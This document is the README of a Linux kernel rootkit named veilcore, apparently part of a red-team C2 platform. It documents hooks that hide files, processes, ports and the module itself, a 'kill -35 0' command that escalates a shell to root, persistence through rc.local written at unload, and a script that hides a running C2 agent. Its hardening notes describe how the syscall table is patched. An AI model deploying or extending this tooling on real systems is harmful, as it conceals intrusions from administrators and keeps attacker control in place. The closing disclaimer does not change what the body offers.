# veilcore — Linux LKM (observation-layer control)

Kernel-module endpoint of the Fei platform: dual-channel hooks (syscall
table `getdents`/`getdents64`/`kill`/`reboot` + ftrace on the network
`seq_show` family) providing filename-prefix hiding, process hiding,
module self-hiding, TCP/UDP port hiding, privilege escalation and
shutdown write-back persistence. Targets Linux 2.6.x–6.x, x86/x86_64.

## Build & load

```
make && sudo insmod veilcore.ko ko_path=$(pwd)/veilcore.ko
```

Requires matching kernel headers (`/lib/modules/$(uname -r)/build`).
On 5.7+ `kallsyms_lookup_name` is bootstrapped through a kprobe.

## Operations

| Command | Effect |
|---------|--------|
| `make && sudo insmod veilcore.ko ko_path=$(pwd)/veilcore.ko` | Load |
| `kill -34 <pid>` | Hide/show process (invisible in `/proc`) |
| `kill -35 0` | Elevate current shell to root |
| `kill -36 0` | Toggle module visibility in lsmod |
| `kill -37 <port>` | Toggle port hiding (invisible in `/proc/net`) |
| `touch /veil_secret` | Create a file with the magic prefix (invisible to `ls`) |
| `rmmod veilcore` | Unload (triggers `.ko` write-back + rc.local persistence) |

The module unlinks itself from the module list on load (last step of the
success path), so `lsmod` shows nothing until `kill -36 0`. Unload with
`make remove` which restores visibility first.

## Hardening implemented relative to the reference design

- `SYSCALL_ARG1/2` macros instead of hard-coded `di/si` (i386 uses `bx/cx`);
  the pt_regs convention is only engaged on x86_64 > 4.16
- `__NR_getdents` fallback: 141 on `CONFIG_X86_32`, else 78
- `FILE_INODE(file)` version ladder (3.19 / 3.9 / older)
- `inet_sport/inet_dport` vs `sport/dport` (2.6.33 boundary)
- module hide is the **last** init step; every failure path rolls back only
  what was installed and never calls `module_show`
- syscall-table writes go through CR0.WP **plus** the page PTE (`_PAGE_RW`)
  on every install/remove, restoring both afterwards
- network ftrace is non-fatal: partial installs roll back internally,
  syscall hooks stay, module still loads
- `GET_INODE(fd)` NULL-checks every hop (`files`/`fdt`/`fd[fd]`)
- port list protected with `spin_lock_bh` (seq_show may run in softirq)
- `register_kprobe` return value checked before `kp.addr` is used
- `copy_to_user` failure returns the original length (user buffer kept
  its unfiltered contents)
- `__force_order`-anchored inline-assembly CR0 writes above 4.16
- local `strnstr` equivalent instead of relying on the export


## C2 integration

Once a Fei agent runs on the host, apply the hiding layers:

```sh
sudo ./integrate.sh <agent-pid> <agent-port> /var/lib/fei-agent
```

- process hiding: `kill -34 <pid>`
- port hiding: `kill -37 <port>` (both /proc/net/tcp and tcp6)
- file hiding: binaries live under a `veil_` prefix (renamed by the
  script); getdents never lists them
- module self-hiding is on by default (`lsmod` clean); `kill -36 0`
  restores visibility for maintenance
- the rc.local autostart written at unload/reboot reloads the module;
  extend it to relaunch the agent from its veil_-prefixed path

## Disclaimer

> This project is a Linux kernel-programming learning artifact within an
> authorized red-team research platform. It has not been rigorously tested
> on every supported kernel. Use is limited to authorized laboratory
> environments. Use for illegal purposes is prohibited.
